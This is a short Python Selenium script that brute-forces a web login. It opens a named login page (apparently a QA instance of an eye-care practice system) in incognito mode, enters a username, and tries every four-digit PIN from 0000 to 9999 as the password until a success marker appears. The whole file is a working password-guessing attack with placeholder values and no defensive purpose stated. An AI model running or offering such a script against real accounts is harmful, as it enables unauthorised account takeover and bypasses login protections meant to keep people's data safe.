import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time

def generate_pins():
    for pin in range(10000):  # Generates PINs from 0000 to 9999
        yield f'{pin:04}'  # Format as a 4-digit string

def main():
    # Set up Chrome options for incognito mode
    chrome_options = Options()
    chrome_options.add_argument("--incognito")

    # Set up the WebDriver (ensure the path to your WebDriver is correct)
    service = Service('path/to/chromedriver')
    driver = webdriver.Chrome(service=service, options=chrome_options)

    try:
        # Open the login page
        driver.get('https://qa8.maximeyes.com/Account/Login')

        # Allow the page to load
        time.sleep(2)

        # Find the username field
        username_field = driver.find_element(By.NAME, 'username')  # Update with the actual field name
        username_field.send_keys('your_username')  # Enter your actual username

        # Iterate through each generated PIN
        for pin in generate_pins():
            # Find the password field and enter the PIN
            password_field = driver.find_element(By.NAME, 'password')  # Update with the actual field name
            password_field.clear()  # Clear any existing text
            password_field.send_keys(pin)  # Enter the current PIN

            # Submit the form
            password_field.send_keys(Keys.RETURN)

            # Allow time to see the result of the login attempt
            time.sleep(2)

            # Check for a successful login here (you might want to adjust this part)
            # For example, check if a specific element is present on the page
            if "success condition" in driver.page_source:  # Update with an actual success condition
                print(f'Success! The correct PIN is: {pin}')
                break

    finally:
        # Close the browser
        driver.quit()

if __name__ == '__main__':
    main()
